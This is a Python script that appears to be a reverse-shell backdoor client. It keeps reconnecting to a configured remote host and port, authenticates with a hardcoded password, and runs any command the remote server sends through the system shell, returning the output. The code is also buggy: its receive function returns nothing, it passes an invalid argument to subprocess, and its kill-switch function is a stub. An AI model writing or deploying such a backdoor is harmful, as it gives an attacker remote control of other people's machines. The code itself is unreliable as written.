import subprocess, socket, os, threading
import socket
import os
path = ''
cwd = ''
ip = 'null'
port = 0
def listenForKillSwitch():
	kill = socket.socket(socket.AF_INET)
def recieve(s, buff=1024):
	global data
	data = b''
	while True:
		packet = s.recv(buff)
		data += packet
		if len(packet) < buff:
			break
def cd(newdir):
	global path, cwd
	path = os.path.normpath(f'{path}/{newdir}')
	cwd = os.path.abspath(path)
while True:
	try:
		pswd = 'password'
		srvr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		path = '.'
		cwd = os.path.abspath(path)
		while True:
			try:
				srvr.connect((ip, port))
				break
			except:
				continue
		srvr.send(b'@LOGIN')
		while True:
			data = recieve(srvr)
			msg = data.decode()
			if msg == pswd:
				srvr.send(b'@CONNECTED')
				while True:
					data = recieve(srvr)
					msg = data.decode()
					if msg == '@CONFIRM-CONNECTION':
						break
					else:
						continue
				break
			else:
				srvr.send(b'@DENIED')
				continue
		while True:
			srvr.send(bytes(f'@GET-INPUT#({cwd})> ', 'utf-8'))
			data = recieve(srvr)
			msg = data.decode()
			if msg.find('@PRINT ') == 0 or msg.find('::p ') == 0:
				print(msg[7:])
				continue
			elif msg.find('cd ') == 0:
				cd(msg[3:])
				continue
			else:
				msg = subprocess.call(msg, shell=True, captureOutput=True, cwd=cwd)
				data = bytes(msg, 'utf-8')
				srvr.send(data)
				continue
	except ConnectionResetError:
		continue